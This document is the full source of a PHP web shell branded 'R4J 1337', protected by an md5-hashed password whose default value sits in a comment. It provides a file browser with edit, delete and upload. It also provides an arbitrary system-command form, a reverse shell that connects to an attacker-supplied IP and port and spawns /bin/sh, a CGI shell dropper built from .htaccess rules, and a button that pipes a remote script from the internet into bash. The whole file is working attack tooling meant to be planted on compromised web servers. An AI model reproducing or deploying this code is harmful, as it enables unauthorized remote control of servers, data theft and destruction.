<?php
session_start();
if(md5($_POST['pass']) == "50dc1a362faebd4024fac55616b26d0e") { #default pass: r4j1337
  $_SESSION['admin'] = "true";
  header("location: ?path=/");
}
if($_SESSION['admin'] !== "true") {
  login_shell();
  die();
}
function login_shell() {
echo '

<style>
@import url(https://fonts.googleapis.com/css?family=Roboto+Condensed);

    .raj {
    color: #7FFF00;
    font-size:17;
    margin: auto;
    }

    body {
        background-color: #000000;
        font-family: \'Roboto Condensed\', sans-serif;
        font-size: 40px;
        color: #ffffff;
    }

    #hiddenInput {
        font-size: 40px;
        font-family: \'Roboto Condensed\', sans-serif;
        background-color: #808080;
        position: absolute;
        opacity: 0.4;
        margin-top: -22px;
        margin-left: -125px;
        opacity: 0;
        filter: alpha(opacity = 0);
    }

    #container {
        position: absolute;
        top: 80px;
        left: 50%;
    }

    #input {
        position: absolute;
        margin-top: -20px;
        margin-left: -120px;
    }

    .letterContainer {
        display: inline;
        white-space: nowrap;
    }

    .letterStatic {
        display: inline;
    }

    .letterAnimTop {
        display: inline;
        position: absolute;
        -webkit-animation: dropTop .1s ease;
        -moz-animation: dropTop .1s ease;

    }

    .letterAnimBottom {
        display: inline;
        position: absolute;
        -webkit-animation: dropBottom .1s ease;
        -moz-animation: dropBottom .1s ease;
    }

    .blink {
        position: static;
        top: -5px;
        -webkit-animation: blink 0.3s ease 0 infinite alternate;
        -moz-animation: blink 0.3s ease 0 infinite alternate;
    }

    @-moz-keyframes blink {
        from { opacity: 0 }
        to { opactiy: 1 }
    }

    @-webkit-keyframes blink {
        from { opacity: 0 }
        to { opactiy: 1 }
    }

    @-moz-keyframes dropTop {
        from {
            -moz-transform: translateX(0) translateY(-20px) translateZ(20px) rotateX(90deg);
            transform: translateX(0) translateY(-20px) translateZ(20px) rotateX(90deg);
        }

        to {
            -moz-transform: translateX(0) translateY(0) translateZ(0) rotateX(0deg);
            transform: translateX(0) translateY(0) translateZ(0) rotateX(0deg);
        }
    }

    @-moz-keyframes dropBottom {
        from {
            -moz-transform: translateY(20px) translateZ(20px) rotateX(-90deg);
            transform: translateY(20px) translateZ(20px) rotateX(-90deg);
        }

        to {
            -moz-transform: rotateX(0deg);
            transform: rotateX(0deg);
        }
    }

    @-webkit-keyframes dropTop {
        from { -webkit-transform: translateX(0) translateY(-20px) translateZ(20px) rotateX(90deg); }
        to { -webkit-transform: translateX(0) translateY(0) translateZ(0) rotateX(0deg); }
}

    @-webkit-keyframes dropBottom {
        from { -webkit-transform: translateY(20px) translateZ(20px) rotateX(-90deg); }
        to { -webkit-transform: rotateX(0deg); }
    }
</style>
<script>
var input;
var cursor;
var hiddenInput;
var content = [];
var lastContent = "", targetContent = "";
var inputLock = false;
var autoWriteTimer;

var isMobile, isIE;

window.onload = function() {

    isMobile = navigator && navigator.platform && navigator.platform.match(/^(iPad|iPod|iPhone)$/);

    isIE = (navigator.appName == \'Microsoft Internet Explorer\');

    input = document.getElementById(\'input\');

    hiddenInput = document.getElementById(\'hiddenInput\');
    hiddenInput.focus();

    cursor = document.createElement(\'cursor\');
    cursor.setAttribute(\'class\', \'blink\');
    cursor.innerHTML = "|";

    if (!isMobile && !isIE) input.appendChild(cursor);

    function refresh() {

        inputLock = true;

        if (targetContent.length - lastContent.length == 0) return;

        var v = targetContent.substring(0, lastContent.length + 1);

        content = [];

        var blinkPadding = false;

        for (var i = 0; i < v.length; i++) {
            var l = v.charAt(i);

            var d = document.createElement(\'div\');
            d.setAttribute(\'class\', \'letterContainer\');

            var d2 = document.createElement(\'div\');

            var animClass = (i % 2 == 0) ? \'letterAnimTop\' : \'letterAnimBottom\';

            var letterClass = (lastContent.charAt(i) == l) ? \'letterStatic\' : animClass;

            if (letterClass != \'letterStatic\') blinkPadding = true;

            d2.setAttribute(\'class\', letterClass);

            d.appendChild(d2);

            d2.innerHTML = l;
            content.push(d);
        }

        input.innerHTML = \'\';

        for (var i = 0; i < content.length; i++) {
            input.appendChild(content[i]);
        }

        cursor.style.paddingLeft = (blinkPadding) ? \'22px\' : \'0\';

        if (!isMobile && !isIE) input.appendChild(cursor);

        if (targetContent.length - lastContent.length > 1) setTimeout(refresh, 150);
        else inputLock = false;

        lastContent = v;
    }

    if (document.addEventListener) {

        document.addEventListener(\'touchstart\', function(e) {
            clearInterval(autoWriteTimer);
            targetContent = lastContent;
        }, false);

        document.addEventListener(\'click\', function(e) {
            clearInterval(autoWriteTimer);
            targetContent = lastContent;
            hiddenInput.focus();
        }, false);

        if (!isIE) {
            // Input event is buggy on IE, so don\'t bother
            // (https://msdn.microsoft.com/en-us/library/gg592978(v=vs.85).aspx#feedback)
            // We will use a timer instead (below)
            hiddenInput.addEventListener(\'input\', function(e) {
                e.preventDefault();
                targetContent = hiddenInput.value;
                if (!inputLock) refresh();

            }, false);
        } else {
            setInterval(function() {
                targetContent = hiddenInput.value;

                if (targetContent != lastContent && !inputLock) refresh();
            }, 100);
        }

    }

    hiddenInput.value = "";

    autoWriteTimer = setTimeout(function() {
        if (lastContent != "") return;
        targetContent = "Password ...";
        refresh();
    }, 2000);
}
</script>
<form method=POST>
<div id="container">
    <div id="input"></div>
    <input name=pass type="text" id="hiddenInput">
</div><form> 
<br><br><br><br><br><br>

<pre class=raj><center>
╔═════════════════════════════════════════════════════════╗
║ ██████╗ ██╗  ██╗     ██╗     ██╗██████╗ ██████╗ ███████╗║
║ ██╔══██╗██║  ██║     ██║    ███║╚════██╗╚════██╗╚════██║║
║ ██████╔╝███████║     ██║    ╚██║ █████╔╝ █████╔╝    ██╔╝║
║ ██╔══██╗╚════██║██   ██║     ██║ ╚═══██╗ ╚═══██╗   ██╔╝ ║
║ ██║  ██║     ██║╚█████╔╝     ██║██████╔╝██████╔╝   ██║  ║
║ ╚═╝  ╚═╝     ╚═╝ ╚════╝      ╚═╝╚═════╝ ╚═════╝    ╚═╝  ║
╚═════════════════════════════════════════════════════════╝

</pre>
';
}
?>
<style>
a {
    color: #40f944;
    text-decoration: none;
}
a.feature {
    background-color: #f44336;
    color: blue;
    padding: 8px 12px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
}


a.feature {
    background-color: red;
}
a.feature2 {
    background-color: #f44336;
    color: red;
    padding: 8px 12px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
}


a.feature2 {
    background-color: blue;
}
a.delete {
    color: #40f944;
    font-size: small;
    text-decoration: none;
    float: right;
}
a.delete:hover
{
    color: #40f944;
    text-decoration: none;         
}
a.edit {
    color: #40f944;
    font-size: small;
    text-decoration: none;
    float: right;
}
a.edit:hover
{
    color: #40f944;
    text-decoration: none;         
}
hr {
    display: block;
    margin-top: 0.1em;
    margin-bottom: 0.1em;
    margin-left: auto;
    margin-right: auto;
    border-style: inset;
    border-width: 1px;
}
.greendir {
    color: green;
}
.contents {
    color: #7FFF00;
    font-size:17;
    margin: auto;
    border: 2px solid #FF0000;
}

table {
    border-collapse: collapse;
}

table, th, td {
    border: 1px solid green;
    width: 1898;
}
</style>
<body bgcolor=black>

<?php
$uname = php_uname();
$sftwr = getenv("SERVER_SOFTWARE");
echo "<font size=2 color=white>Server : ", $sftwr,"<br>";
echo "System : $uname <br>";
$serverip = gethostbyname($_SERVER["HTTP_HOST"]);
$clientip = $_SERVER['REMOTE_ADDR'];
echo "Server Ip: ", $serverip, " | Client Ip: ", $clientip, "<br>";
error_reporting(0);
set_time_limit(0);

echo "You Are Here : ";



if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}

if(isset($_GET['path'])){
    $path = $_GET['path'];
}else{
    $path = getcwd();
}
$pathen = $path;
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a class=greendir href="?path='."/".'">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    $linkpath = '';
    for($i=0;$i<=$id;$i++){
        $linkpath .= "$paths[$i]";
        if($i != $id) $linkpath .= "/";
    }
    echo $linkpath;
    echo '">'.$pat.'</a>/';
}
echo "<br><br><a href=?path=/ class=feature2>Exprorer</a><a href=?reverse=yes class=feature>Reverse Shell</a><a href=?cgi=yes class=feature2>Cgi Shell</a><a href=?cmd=yes class=feature>System Shell</a><a href=?localexp=yes class=feature2>Local Exploit Suggester</a><a href=?uppload=yes class=feature>Upload</a><a href=?logout=yes class=feature2>Logout</a><br><br><hr color = green>";
echo "<font size=2>";
$path = $_GET['path'];
if(is_dir($path)) {
  $ls = scandir($path);
  $length = count($ls);
  for($x = "-1"; $x <= $length; $x++) {
    chdir($path);
    if(is_dir($ls[$x])) {
      echo "<br><a href=?path=$path/$ls[$x]>[$ls[$x]]</a><hr>";
      
        
      
    }
  }
}
if(is_dir($path)) {
  $ls = scandir($path);
  $length = count($ls);
  for($x = "-1"; $x <= $length; $x++) {
    chdir($path);
    $lsx = $ls[$x];
    if(!is_dir($ls[$x])) {
      echo "<br><a href=?path=$path/$ls[$x]>$ls[$x]</a>   <a class=delete href=?delete=$path/$ls[$x]>_delete</a> <a class=edit href=?edit=$path/$ls[$x]>edit</a><hr>";
      
    }
  }
} else {
    echo "<br><br>";  
    echo "<pre class=contents>", htmlspecialchars(file_get_contents($path)), "</pre>";
}

function edit($edit) {
echo "<center>";
if(isset($_POST['src'])){
  $fp = fopen($_GET['edit'],'w');
  if(fwrite($fp,$_POST['src'])){
    echo '<font color="green">File Edited Successfully!</font><br />';
            }else{
                echo '<font color="red">An error occured while editing the file</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
         <br><br><br><br><br><br><br><br>
        <textarea cols=100 rows=30 name="src">'.htmlspecialchars(file_get_contents($_GET['edit'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_GET['edit'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
        echo '</center>';
}

$delete = $_GET['delete'];
function delete($delete) {
if (!unlink($delete))
  {
  echo ("Error deleting $delete");
  }
else
  {
  echo ("Deleted $delete");
  }
}

if($_GET['delete'] != "") {
  delete($delete);
}

if($_GET['edit'] != "") {
  edit($edit);
}

if($_GET['reverse'] == "yes") {
  revshell();
}

function revshell() {
echo '<form> IP: <input type=text name="ip"> Port: <input type=text name="port"><input type=submit value=submit></form>';

set_time_limit (0);
$VERSION = "1.0";
$ip = $_GET['ip'];  // CHANGE THIS
$port = $_GET['port'];       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

} 

if($_GET['cgi'] == "yes") {
  cgi();
}

function cgi() {

$dir = 'shell';
$shell = 'shell.hax';

function create_directory($folder) {
    echo "Creating directory... ";
    mkdir($folder, 0777) or die('failed<br />');
    echo "done<br />";
}

function create_htaccess($file, $ext) {
    echo "Creating htaccess... ";
    $handle = fopen($file, 'w') or die('failed<br />');
    $data = <<<EOT
Options +ExecCGI
AddHandler cgi-script .$ext
EOT;
    fwrite($handle, $data);
    fclose($handle);
    echo "done<br />";
}

function create_shell($file) {
    echo "Creating shell... ";
    $handle = fopen($file, 'w') or die('failed<br />');
    $data = <<<EOT
#!/bin/sh
echo "Content-type: text/plain"
echo ""
/bin/sh -c "\$QUERY_STRING 2>&1"
EOT;
    fwrite($handle, $data);
    fclose($handle);
    echo "done<br />";
    echo "Making shell executable... ";
    chmod($file, 0755) or die('failed<br />');
    echo "done<br />";
}

function remove_shell($shell) {
    if (file_exists($shell)) {
        echo "Deleting shell... ";
        unlink($shell);
        echo "done<br />";
    }
}

function remove_htaccess($htaccess) {
    if (file_exists($htaccess)) {
        echo "Deleting htaccess... ";
        unlink($htaccess);
        echo "done<br />";
    }
}

function remove_directory($dir) {
    if (is_dir($dir)) {
        echo "Deleting folder... ";
        rmdir($dir);
        echo "done<br />";
    }
}

function display_shell($shell) {
    if (file_exists($shell)) {
        echo "<p>shell at [<a href=\"$shell\">$shell</a>]</p>";
        echo "<form action=\"\" method=\"post\">";
        echo "<input type=\"hidden\" name=\"remove\" value=\"1\" />";
        echo "<input type=\"submit\" value=\"remove shell\" />";
        echo "</form>";
        echo "<form action=\"\" method=\"post\">";
        echo "command: <input autofocus type=\"text\" name=\"cmd\" />";
        echo "<input type=\"submit\" value=\"exec\" /></form>";
    }
    else {

        echo "<p>no shell found.</p>";
        echo "<form action=\"\" method=\"post\">";
        echo "<input type=\"hidden\" name=\"create\" value=\"1\" />";
        echo "<input type=\"submit\" value=\"create shell\" />";
        echo "</form>";
    }
}

function execute_command($shell, $cmd) {
    $path = dirname($_SERVER['PHP_SELF']);
    $shell_url = "http://$_SERVER[HTTP_HOST]$path/$shell";
    $cmd = str_replace(' ', '${IFS}', $cmd);
    $response = file_get_contents($shell_url . '?' . $cmd);
    $output = htmlspecialchars($response);
    echo "Output:<br /><textarea rows=25 cols=80>$output</textarea>";
}

$htaccess = "$dir/.htaccess";
$shell = "$dir/$shell";
$ext = pathinfo($shell, PATHINFO_EXTENSION);

if (isset($_REQUEST['remove'])) {
    remove_shell($shell);
    remove_htaccess($htaccess);
    remove_directory($dir);
}

if (isset($_REQUEST['create'])) {
    create_directory($dir);
    create_htaccess($htaccess, $ext);
    create_shell($shell);
}

display_shell($shell);

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    execute_command($shell, $cmd);
}

}

function sysshell() {
echo "<form method=POST><input type=text name=cmd><input type=submit value=exec></form>";
$cmd = $_POST['cmd'];
echo "<pre>";
system($cmd);
echo "</pre>";
}

if($_GET['cmd'] == "yes") {
  sysshell();
}

if($_GET['localexp'] == "yes") {
  echo "<pre>";
  system("curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash");
  echo "</pre>";
}

if($_GET['logout'] == "yes") {
  session_destroy();
  header("location: ?path=/");
}
if($_GET['uppload'] == "yes") {
  upload();
}

function upload() {
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo "File Uploaded <a href='"; echo $_FILES["file"]["name"]; echo "'>here</a>"; } else { echo '<b>Upload Error!</b><br><br>'; } }
}
?>

